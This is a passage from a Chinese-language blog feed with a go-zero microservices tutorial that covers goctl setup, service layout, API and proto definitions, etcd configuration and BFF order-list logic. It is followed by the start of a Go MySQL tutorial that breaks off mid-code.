<li>把<code>C:\Users\Administrator\go\bin\goctl.exe</code> 拷贝到GOROOT\bin目录下</li>
<li>查看版本成功</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGoZero\apps\order&gt; goctl --version</span><br><span class="line">goctl version 1.5.4 windows/amd64</span><br></pre></td></tr></table></figure>

<ul>
<li>安装<code>protoc</code> ，查看他的<a href="https://go-zero.dev/docs/tasks/installation/protoc">作用</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">goctl env check --install --verbose --force</span><br></pre></td></tr></table></figure>

<ul>
<li>安装<code>protoc</code> 成功后，把<code>C:\Users\Administrator\go\bin\</code> 的相关文件拷贝到<code>GOROOT\bin</code></li>
</ul>
<h2 id="服务划分"><a href="#服务划分" class="headerlink" title="服务划分"></a>服务划分</h2><p><img src="/aposts/4d2d858d/image-20230721102332169.png" alt="image-20230721102332169"></p>
<p>从以上思维导图可以看出整个电商系统功能还是比较多的，我们根据业务职能做如下微服务的划分：</p>
<ul>
<li>商品服务(product) - 商品的添加、信息查询、库存管理等功能</li>
<li>购物车服务(cart) - 购物车的增删改查</li>
<li>订单服务(order) - 生成订单，订单管理</li>
<li>支付服务(pay) - 通过调用第三方支付实现支付功能</li>
<li>账号服务(user) - 用户信息、等级、封禁、地址管理</li>
<li>推荐服务(recommend) - 首页商品推荐</li>
<li>评论服务(reply) - 商品的评论功能、评论的回复功能</li>
</ul>
<h2 id="BFF层"><a href="#BFF层" class="headerlink" title="BFF层"></a>BFF层</h2><ul>
<li>但对于一个复杂的高并发的系统来说，我们需要处理各种异常的场景，比如某个页面需要依赖多个微服务提供的数据，为了避免串行请求导致的耗时过长，我们一般会并行的请求多个微服务，这个时候其中的某个服务请求异常的话我们可能需要做一些特殊的处理，比如提供一些降级的数据等。我们的解决方案就是加一层，即BFF层，通过BFF对外提供HTTP接口，客户端只与BFF进行交互，<strong>我们的这个项目为了简化只会采用一个BFF服务</strong></li>
</ul>
<p><img src="/aposts/4d2d858d/image-20230721102651764.png" alt="image-20230721102651764"></p>
<ul>
<li>我们可以提供多个BFF吗？答案是当然可以。BFF的目的是为客户端提供一个集中的接口，例如移动端页面和浏览器页面的数据协议不同，这种情况下为了更好的表示数据，可以使用两个BFF，同时只供一个BFF如果该BFF异常就会导致所有的业务受影响，提供多个BFF也可以提高服务的可用性，降低业务异常的影响面。多个BFF架构图如下：</li>
</ul>
<p><img src="/aposts/4d2d858d/image-20230721102751280.png" alt="image-20230721102751280"></p>
<h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><ul>
<li>初始化项目</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd E:\proj\gowork</span><br><span class="line">mkdir studyGoZero</span><br><span class="line">cd studyGoZero</span><br><span class="line">go mod init example.com/studyGoZero</span><br></pre></td></tr></table></figure>

<ul>
<li>目录结构如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─apps</span><br><span class="line">│  ├─app</span><br><span class="line">│  │  └─api</span><br><span class="line">│  ├─cart</span><br><span class="line">│  │  ├─admin</span><br><span class="line">│  │  ├─rmq</span><br><span class="line">│  │  └─rpc</span><br><span class="line">│  ├─order</span><br><span class="line">│  │  ├─admin</span><br><span class="line">│  │  ├─rmq</span><br><span class="line">│  │  └─rpc</span><br><span class="line">│  ├─paly</span><br><span class="line">│  │  ├─admin</span><br><span class="line">│  │  ├─rmq</span><br><span class="line">│  │  └─rpc</span><br><span class="line">│  ├─product</span><br><span class="line">│  │  ├─admin</span><br><span class="line">│  │  ├─rmq</span><br><span class="line">│  │  └─rpc</span><br><span class="line">│  ├─recommend</span><br><span class="line">│  │  ├─admin</span><br><span class="line">│  │  ├─rmq</span><br><span class="line">│  │  └─rpc</span><br><span class="line">│  ├─reply</span><br><span class="line">│  │  ├─admin</span><br><span class="line">│  │  ├─rmq</span><br><span class="line">│  │  └─rpc</span><br><span class="line">│  └─user</span><br><span class="line">│      ├─admin</span><br><span class="line">│      ├─rmq</span><br><span class="line">│      └─rpc</span><br><span class="line">└─pkg</span><br></pre></td></tr></table></figure>

<ul>
<li>其中apps存放的是我们所有的微服务，比如order为订单相关的微服务，pkg目录为所有服务共同依赖的包的存放路径，比如所有的服务都需要依赖鉴权就可以放到pkg目录下</li>
<li>app - BFF服务</li>
<li>cart - 购物车服务</li>
<li>order - 订单服务</li>
<li>pay - 支付服务</li>
<li>product - 商品服务</li>
<li>recommend - 推荐服务</li>
<li>reply - 评论服务</li>
<li>user - 账号服务</li>
</ul>
<p>在每个服务目录下我们又会分为多个服务，主要会有如下几类服务：</p>
<ul>
<li>api - 对外的BFF服务，接受来自客户端的请求，暴露HTTP接口</li>
<li>rpc - 对内的微服务，仅接受来自内部其他微服务或者BFF的请求，暴露gRPC接口</li>
<li>rmq - 负责进行流式任务处理，上游一般依赖消息队列，比如kafka等</li>
<li>admin - 也是对内的服务，区别于rpc，更多的是面向运营侧的且数据权限较高，通过隔离可带来更好的代码级别的安全，直接提供HTTP接口</li>
</ul>
<h2 id="API-定义"><a href="#API-定义" class="headerlink" title="API 定义"></a>API 定义</h2><h3 id="首页API"><a href="#首页API" class="headerlink" title="首页API"></a>首页API</h3><p>首页功能主要分为四个部分，<strong>搜索、Banner图、限时抢购和推荐商品</strong>列表，点击搜索框会跳转到搜索页，推荐部分是分页展示的，用户通过不断地往上滑动可以加载下一页。通过分析首页我们大致需要提供三个接口，分别是Banner接口，限时抢购接口和推荐接口。</p>
<p><img src="/aposts/4d2d858d/image-20230720110620328.png" alt="image-20230720110620328"></p>
<ul>
<li>打开<code>apps\app\api\api.api</code>文件，写入对外api的代码定义</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;v1&quot;</span><br><span class="line">type (</span><br><span class="line">	// 首页的banner响应请求</span><br><span class="line">	HomeBannerResponse &#123;</span><br><span class="line">		Banners []*Banner `json:&quot;banners&quot;`</span><br><span class="line">	&#125;</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">service api-api &#123;</span><br><span class="line"></span><br><span class="line">	@doc &quot;首页Banner&quot;</span><br><span class="line">	@handler HomeBannerHandler</span><br><span class="line">	get /v1/home/banner returns (HomeBannerResponse)</span><br><span class="line"></span><br><span class="line">	@doc &quot;限时抢购&quot;</span><br><span class="line">	@handler FlashSaleHandler</span><br><span class="line">	get /v1/flashsale returns (FlashSaleResponse)</span><br><span class="line"></span><br><span class="line">	@doc &quot;推荐商品列表&quot;</span><br><span class="line">	@handler RecommendHandler</span><br><span class="line">	get /v1/recommend (RecommendRequest) returns (RecommendResponse)</span><br><span class="line"></span><br><span class="line">	@doc &quot;分类商品列表&quot;</span><br><span class="line">	@handler CategoryListHandler</span><br><span class="line">	get /v1/category/list (CategoryListRequest) returns (CategoryListResponse)</span><br><span class="line">	@doc &quot;购物车列表&quot;</span><br><span class="line">	@handler CartListHandler</span><br><span class="line">	get /v1/cart/list (CartListRequest) returns (CartListResponse)</span><br><span class="line"></span><br><span class="line">	@doc &quot;商品评论列表&quot;</span><br><span class="line">	@handler ProductCommentHandler</span><br><span class="line">	get /v1/product/comment (ProductCommentRequest) returns (ProductCommentResponse)</span><br><span class="line"></span><br><span class="line">	@doc &quot;订单列表&quot;</span><br><span class="line">	@handler OrderListHandler</span><br><span class="line">	get /v1/order/list (OrderListRequest) returns (OrderListResponse)</span><br><span class="line"></span><br><span class="line">	@doc &quot;商品详情&quot;</span><br><span class="line">	@handler ProductDetailHandler</span><br><span class="line">	get /v1/product/detail (ProductDetailRequest) returns (ProductDetailResponse)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>定义好api后，我们使用如下命令重新生成项目代码，输出如下信息表明生成成功</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGoZero\apps\app\api&gt; goctl api go -api api.api -dir .</span><br><span class="line">Done.</span><br><span class="line"></span><br><span class="line">// 查看目录</span><br><span class="line">PS E:\proj\gowork\studyGoZero\apps\app\api&gt; tree /f</span><br><span class="line">E:.</span><br><span class="line">│  api.api</span><br><span class="line">│  api.go</span><br><span class="line">│</span><br><span class="line">├─etc</span><br><span class="line">│      api-api.yaml</span><br><span class="line">│</span><br><span class="line">└─internal</span><br><span class="line">    ├─config</span><br><span class="line">    │      config.go</span><br><span class="line">    │</span><br><span class="line">    ├─handler</span><br><span class="line">    │      cartlisthandler.go</span><br><span class="line">    │      categorylisthandler.go</span><br><span class="line">    │      flashsalehandler.go</span><br><span class="line">    │      homebannerhandler.go</span><br><span class="line">    │      orderlisthandler.go</span><br><span class="line">    │      productcommenthandler.go</span><br><span class="line">    │      productdetailhandler.go</span><br><span class="line">    │      recommendhandler.go</span><br><span class="line">    │      routes.go</span><br><span class="line">    │</span><br><span class="line">    ├─logic</span><br><span class="line">    │      cartlistlogic.go</span><br><span class="line">    │      categorylistlogic.go</span><br><span class="line">    │      flashsalelogic.go</span><br><span class="line">    │      homebannerlogic.go</span><br><span class="line">    │      orderlistlogic.go</span><br><span class="line">    │      productcommentlogic.go</span><br><span class="line">    │      productdetaillogic.go</span><br><span class="line">    │      recommendlogic.go</span><br><span class="line">    │</span><br><span class="line">    ├─svc</span><br><span class="line">    │      servicecontext.go</span><br><span class="line">    │</span><br><span class="line">    └─types</span><br><span class="line">            types.go</span><br></pre></td></tr></table></figure>

<h2 id="admin-层代码"><a href="#admin-层代码" class="headerlink" title="admin 层代码"></a>admin 层代码</h2><h3 id="order目录"><a href="#order目录" class="headerlink" title="order目录"></a>order目录</h3><ul>
<li><p>目录为： E:\proj\gowork\studyGoZero\apps\order</p>
</li>
<li><p>执行如下命令即可初始化<code>order admin</code>代码，注意<code>order admin</code>为<code>api</code>服务，<strong>直接对前端提供HTTP接口</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\studyGoZero\apps\order&gt; goctl api new admin</span><br></pre></td></tr></table></figure>
</li>
<li><p>代码结构如下</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─admin</span><br><span class="line">│  │  admin.api</span><br><span class="line">│  │  admin.go</span><br><span class="line">│  │</span><br><span class="line">│  ├─etc</span><br><span class="line">│  │      admin-api.yaml</span><br><span class="line">│  │</span><br></pre></td></tr></table></figure>

<ul>
<li><p>生成的服务代码我们可以直接运行<code>go run admin.go</code>，默认侦听在8888端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGoZero\apps\order\admin&gt; go run .\admin.go </span><br><span class="line">Starting server at 0.0.0.0:8888...</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于rmq服务我们会使用go-zero提供的 <a href="https://github.com/zeromicro/go-queue/tree/master/kq">kq</a> 功能，这里先初始化<code>main.go</code></p>
</li>
</ul>
<h3 id="其他层"><a href="#其他层" class="headerlink" title="其他层"></a>其他层</h3><ul>
<li>pay、pruduct、recommend、reply、user 等按照同样的方式进行初始化</li>
</ul>
<h2 id="rpc服务层"><a href="#rpc服务层" class="headerlink" title="rpc服务层"></a>rpc服务层</h2><ul>
<li><p>Goctl Rpc是<code>goctl</code>脚手架下的一个rpc服务代码生成模块，支持proto模板生成和rpc服务代码生成，通过此工具生成代码你只需要关注业务逻辑编写而不用去编写一些重复性的代码</p>
</li>
<li><p>作者博客中初始化rpc使用的这种 <code>goctl rpc new rpc</code> ，并不推荐，研究代码后发现和作者提供的仓库代码不一致，使用的第二种方式生成的rpc服务层的代码和目录：<code>通过指定proto生成rpc服务</code></p>
</li>
<li><p>因为BFF只负责数据的组装工作，数据真正的来源是各个微服务通过RPC接口提供，接下来我们来定义各个微服务的proto。如下展示的订单列表页面由两部分数据组成，分别是订单数据和商品数据，也就是我们的BFF需要依赖order-rpc和product-rpc来完成该页面数据的组装，下面我们分别来定义order-rpc和product-rpc</p>
</li>
</ul>
<p><img src="/aposts/4d2d858d/image-20230725100643383.png" alt="image-20230725100643383"></p>
<h3 id="order层"><a href="#order层" class="headerlink" title="order层"></a>order层</h3><ul>
<li>在<code>E:\proj\gowork\studyGoZero\apps\order\rpc\order.proto</code>，定义如下，<code>service</code>名字为<code>Order</code>，添加了<code>Orders</code>获取订单列表<code>rpc</code>接口。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;proto3&quot;;</span><br><span class="line"></span><br><span class="line">package order;</span><br><span class="line">option go_package = &quot;./order&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">service Order &#123;</span><br><span class="line">  rpc Orders(OrdersRequest) returns(OrdersResponse);</span><br><span class="line">  rpc CreateOrder(CreateOrderRequest) returns (CreateOrderResponse);</span><br><span class="line">  rpc CreateOrderCheck(CreateOrderRequest) returns (CreateOrderResponse);</span><br><span class="line">  rpc RollbackOrder (CreateOrderRequest) returns (CreateOrderResponse);</span><br><span class="line">  rpc CreateOrderDTM(AddOrderReq) returns (AddOrderResp);</span><br><span class="line">  rpc CreateOrderDTMRevert(AddOrderReq) returns(AddOrderResp);</span><br><span class="line">  rpc GetOrderById(GetOrderByIdReq) returns (GetOrderByIdResp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>使用如下命令重新生成代码，注意这里需要依赖<strong>protoc-gen-go</strong>和<strong>protoc-gen-go-grpc</strong>两个插件，木有安装的话执行下面命令会报错:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGoZero\apps\order\rpc&gt;  goctl rpc protoc order.proto --go_out=. --go-grpc_out=. --zrpc_out=.</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意最终生成的服务端的代码目录为：E:\proj\gowork\studyGoZero\apps\order\rpc\orderclient\order.go</p>
</blockquote>
<p>目录结构如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGoZero\apps\order\rpc&gt; tree /f</span><br><span class="line">卷 软件盘 的文件夹 PATH 列表</span><br><span class="line">卷序列号为 240F-1787</span><br><span class="line">E:.</span><br><span class="line">│  order.go</span><br><span class="line">│  order.proto</span><br><span class="line">│</span><br><span class="line">├─etc</span><br><span class="line">│      order.yaml</span><br><span class="line">│</span><br><span class="line">├─internal</span><br><span class="line">│  ├─config</span><br><span class="line">│  │      config.go</span><br><span class="line">│  │</span><br><span class="line">│  ├─logic</span><br><span class="line">│  │      createorderchecklogic.go</span><br><span class="line">│  │      createorderdtmlogic.go</span><br><span class="line">│  │      createorderdtmrevertlogic.go</span><br><span class="line">│  │      createorderlogic.go</span><br><span class="line">│  │      getorderbyidlogic.go</span><br><span class="line">│  │      orderslogic.go</span><br><span class="line">│  │      rollbackorderlogic.go</span><br><span class="line">│  │</span><br><span class="line">│  ├─server</span><br><span class="line">│  │      orderserver.go</span><br><span class="line">│  │</span><br><span class="line">│  └─svc</span><br><span class="line">│          servicecontext.go</span><br><span class="line">│</span><br><span class="line">├─order</span><br><span class="line">│      order.pb.go</span><br><span class="line">│      order_grpc.pb.go</span><br><span class="line">│</span><br><span class="line">└─orderclient</span><br><span class="line">        order.go</span><br></pre></td></tr></table></figure>

<ul>
<li>本地安装<a href="https://github.com/etcd-io/etcd/releases">etcd</a>，打开<code>E:\app\etcd-v3.4.27-windows-amd64\etcd.exe</code>启动服务</li>
</ul>
<blockquote>
<p> etcd是一个分布式一致性键值存储，其主要用于分布式系统的共享配置和服务发现。</p>
<p> etcd由Go语言编写</p>
</blockquote>
<ul>
<li>生成好后然后启动<code>order-rpc</code>服务，需要连接etcd服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGoZero\apps\order\rpc&gt; go run .\order.go</span><br><span class="line">Starting rpc server at 0.0.0.0:8080...</span><br><span class="line">&#123;&quot;@timestamp&quot;:&quot;2023-07-24T17:03:51.723+08:00&quot;,&quot;caller&quot;:&quot;stat/usage.go:61&quot;,&quot;content&quot;:&quot;CPU: 0m, MEMORY: Alloc=3.2Mi, TotalAlloc=6.1Mi, Sys=17.9Mi, NumGC=3&quot;,&quot;level&quot;:&quot;stat&quot;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:&quot;2023-07-24T17:03:51.737+08:00&quot;,&quot;caller&quot;:&quot;load/sheddingstat.go:61&quot;,&quot;content&quot;:&quot;(rpc) shedding_stat [1m], cpu: 0, total: 0, pass: 0, drop: 0&quot;,&quot;level&quot;:&quot;stat&quot;&#125;</span><br><span class="line">&#123;&quot;@timestamp&quot;:&quot;2023-07-24T17:04:51.711+08:00&quot;,&quot;caller&quot;:&quot;stat/usage.go:61&quot;,&quot;content&quot;:</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在E:\proj\gowork\studyGoZero\apps\order\rpc\etc\order.yaml中，可以看到etcd的连接服务器地址，和order-rpc启动的地址信息：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Name:</span> <span class="string">order.rpc</span></span><br><span class="line"><span class="attr">ListenOn:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:8080</span></span><br><span class="line"><span class="attr">Etcd:</span></span><br><span class="line"><span class="attr">Hosts:</span></span><br><span class="line">	<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:2379</span></span><br><span class="line"><span class="attr">Key:</span> <span class="string">order.rpc</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="product"><a href="#product" class="headerlink" title="product"></a>product</h3><p>在<code>E:\proj\gowork\studyGoZero\apps\product\rpc\product.proto</code>，定义如下，<code>service</code>名字为<code>Order</code>，添加了<code>product</code>产品的<code>rpc</code>接口。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;proto3&quot;;</span><br><span class="line"></span><br><span class="line">package product;</span><br><span class="line">option go_package = &quot;./product&quot;;</span><br><span class="line"></span><br><span class="line">service Product &#123;</span><br><span class="line">  rpc Product(ProductItemRequest) returns (ProductItem) ;</span><br><span class="line">  rpc Products(ProductRequest) returns(ProductResponse);</span><br><span class="line">  rpc ProductList(ProductListRequest) returns(ProductListResponse);</span><br><span class="line">  rpc OperationProducts(OperationProductsRequest) returns (OperationProductsResponse);</span><br><span class="line">  rpc UpdateProductStock(UpdateProductStockRequest) returns (UpdateProductStockResponse);</span><br><span class="line">  rpc CheckAndUpdateStock(CheckAndUpdateStockRequest) returns (CheckAndUpdateStockResponse);</span><br><span class="line">  rpc CheckProductStock(UpdateProductStockRequest) returns (UpdateProductStockResponse);</span><br><span class="line">  rpc RollbackProductStock(UpdateProductStockRequest) returns (UpdateProductStockResponse);</span><br><span class="line">  rpc DecrStock(DecrStockRequest) returns(DecrStockResponse);</span><br><span class="line">  rpc DecrStockRevert(DecrStockRequest) returns(DecrStockResponse);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>E:\proj\gowork\studyGoZero\apps\product\rpc\etc\product.yaml</code>配置启动服务地址端口为8081</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name: product.rpc</span><br><span class="line">ListenOn: 0.0.0.0:8081</span><br><span class="line">Etcd:</span><br><span class="line">  Hosts:</span><br><span class="line">  - 127.0.0.1:2379</span><br><span class="line">  Key: product.rpc</span><br></pre></td></tr></table></figure>

<ul>
<li>启动<code>product-rpc</code>服务，需要连接etcd服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGoZero\apps\product\rpc&gt; go run .\product.go</span><br><span class="line">Starting rpc server at 0.0.0.0:8081...</span><br></pre></td></tr></table></figure>

<h2 id="BUFF-层配置"><a href="#BUFF-层配置" class="headerlink" title="BUFF 层配置"></a>BUFF 层配置</h2><ul>
<li><p>因为我们的BFF需要依赖order.rpc和product.rpc，我们需要先添加配置文件(<code>E:\proj\gowork\studyGoZero\apps\app\api\etc\api-api.yaml</code>)，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name: api-api</span><br><span class="line">Host: 0.0.0.0</span><br><span class="line">Port: 8888</span><br><span class="line">OrderRPC:</span><br><span class="line">    Etcd:</span><br><span class="line">        Hosts:</span><br><span class="line">          - 127.0.0.1:2379</span><br><span class="line">        Key: order.rpc</span><br><span class="line">ProductRPC:</span><br><span class="line">  Etcd:</span><br><span class="line">    Hosts:</span><br><span class="line">      - 127.0.0.1:2379</span><br><span class="line">    Key: product.rpc</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后在<code>E:\proj\gowork\studyGoZero\apps\app\api\internal\svc\servicecontext.go</code>中添加RPC的客户端，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package svc</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;example.com/studyGoZero/apps/app/api/internal/config&quot;</span><br><span class="line">	&quot;example.com/studyGoZero/apps/order/rpc/orderclient&quot;</span><br><span class="line">	&quot;example.com/studyGoZero/apps/product/rpc/productclient&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type ServiceContext struct &#123;</span><br><span class="line">	Config     config.Config</span><br><span class="line">	OrderRPC   orderclient.Order</span><br><span class="line">	ProductRPC productclient.Product</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func NewServiceContext(c config.Config) *ServiceContext &#123;</span><br><span class="line">	return &amp;ServiceContext&#123;</span><br><span class="line">		Config: c,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<p>最后只要在订单接口的<code>E:\proj\gowork\studyGoZero\apps\app\api\internal\logic\orderlistlogic.go</code>方法中添加逻辑就可以啦，这里只是演示，所以会比较简单：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (l *OrderListLogic) OrderList(req *types.OrderListRequest) (resp *types.OrderListResponse, err error) &#123;</span><br><span class="line">	orderRet, err := l.svcCtx.OrderRPC.Orders(l.ctx, &amp;order.OrdersRequest&#123;UserId: req.UID&#125;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	var pids []string</span><br><span class="line">	for _, o := range orderRet.Orders &#123;</span><br><span class="line">		pids = append(pids, strconv.Itoa(int(o.Id)))</span><br><span class="line">	&#125;</span><br><span class="line">	productRet, err := l.svcCtx.ProductRPC.Products(l.ctx, &amp;product.ProductRequest&#123;ProductIds: strings.Join(pids, &quot;,&quot;)&#125;)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	var orders []*types.Order</span><br><span class="line">	for _, o := range orderRet.Orders &#123;</span><br><span class="line">		if p, ok := productRet.Products[o.Id]; ok &#123;</span><br><span class="line">			orders = append(orders, &amp;types.Order&#123;</span><br><span class="line">				OrderID:     o.Orderid,</span><br><span class="line">				ProductName: p.Name,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return &amp;types.OrderListResponse&#123;Orders: orders&#125;, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
<li>请确保order、product 的rpc服务器已经启动</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\studyGoZero\apps\product\rpc&gt; go run .\product.go</span><br><span class="line">Starting rpc server at 0.0.0.0:8081...</span><br><span class="line"></span><br><span class="line">PS E:\proj\gowork\studyGoZero\apps\order\rpc&gt; go run .\order.go</span><br><span class="line">Starting rpc server at 0.0.0.0:8080...</span><br></pre></td></tr></table></figure>

<ul>
<li>启动api层服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\studyGoZero\apps\app\api&gt;go run .\api.go</span><br><span class="line">Starting rpc server at 0.0.0.0:8888...</span><br></pre></td></tr></table></figure>

<ul>
<li>浏览器打开<code>http://127.0.0.1:8888/v1/order/list?uid=123</code> 发现报错空指针</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;content&quot;:&quot;(/v1/order/list?uid=123 - 127.0.0.1:57933) runtime error: invalid memory address or nil pointer dereference\ngoroutine 57 [running]:\nruntime/debug.Stack()\n\tE:/app/Go/src/runtime/debug/stack.go:24 +0x65\ngithub.com/zeromicro/go-zero/rest/handler.RecoverHandler.func1.1()\n\tC:/Users/Administrator/go/pkg/mod/github.com/zeromicro/go-zero@v1.5.4/rest/handler/recoverhandler.go:16 +0x66\npanic(&#123;0x1f56680, 0x331f9d0&#125;)\n\tE:/app/Go/src/runtime/panic.go:884 +0x213\nexample.com/studyGoZero/apps/app/api/internal/logic.(*OrderListLogic).OrderList(0xc0002cfcf8, 0xc00011e380)\n\tE:/proj/gowork/studyGoZero/apps/app/api/internal/logic/orderlistlogic.go:31</span><br></pre></td></tr></table></figure>

<ul>
<li>虽然报错 了，但是可以知道整个服务已经是通的，因为现在并没有订单的任何数据</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>api层- 对外的BFF服务。接受来自客户端的请求，暴露HTTP接口。本次实例启动了api.go，并且连接了order和product的rpc</li>
<li><code>api/api.api</code> 为具体的对我暴露的请求</li>
<li><code>app\api\internal\logic</code> 对应<code>api/api.api</code>为对外暴露请求的具体逻辑，具体代码又调用了order和product的rpc的逻辑</li>
</ul>
<p><img src="/aposts/4d2d858d/image-20230725145056412.png" alt="image-20230725145056412"></p>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>go-zero</tag>
      </tags>
  </entry>
  <entry>
    <title>go-zero实战系列二</title>
    <url>/aposts/76adab24/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><a href="/aposts/4d2d858d/">go-zero实战系列一</a> 中已经编写好api代码、order、product的rpc服务等，下面我们开始绩继续的实践过程</li>
<li>本章主要对数据库的表新建，以及常见的增删改查</li>
</ul>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>go-zero</tag>
      </tags>
  </entry>
  <entry>
    <title>go 操作mysql</title>
    <url>/aposts/481094f/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>对mysql的操作采用了两种，第一种是写原生sql，使用如下两个库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;github.com/go-sql-driver/mysql&quot;</span><br><span class="line">&quot;github.com/jmoiron/sqlx&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>第二种采用orm，使用了如下库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;gorm.io/driver/mysql&quot;</span><br><span class="line">&quot;gorm.io/gorm&quot;</span><br></pre></td></tr></table></figure>

<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul>
<li>本地搭建好mysql环境，数据库和表名如下</li>
</ul>
<p><img src="/aposts/481094f/image-20230608170552494.png" alt="image-20230608170552494"></p>
<h3 id="原生sql"><a href="#原生sql" class="headerlink" title="原生sql"></a>原生sql</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/tmysql/operateMsql.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> tmysql</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jmoiron/sqlx&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go get github.com/go-sql-driver/mysql</span></span><br><span class="line"><span class="comment">//go get github.com/jmoiron/sqlx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应Class表中的字段</span></span><br><span class="line"><span class="keyword">type</span> Class1 <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id   <span class="type">int</span>    <span class="string">`db:&quot;id&quot;`</span> <span class="comment">// 注意这里``的用法，对应数据库的字段</span></span><br><span class="line">	Name <span class="type">string</span> <span class="string">`db:&quot;name&quot;`</span></span><br><span class="line">    	Sex  *<span class="type">string</span> <span class="string">`db:&quot;sex&quot;`</span> <span class="comment">// 表中数据为空，直接取值报错，若是指针则返回nil</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Db *sqlx.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitDb</span><span class="params">()</span></span> &#123;</span><br><span class="line">	database, err := sqlx.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:123456@tcp(127.0.0.1:3306)/test&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;connect mysql err&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	Db = database</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 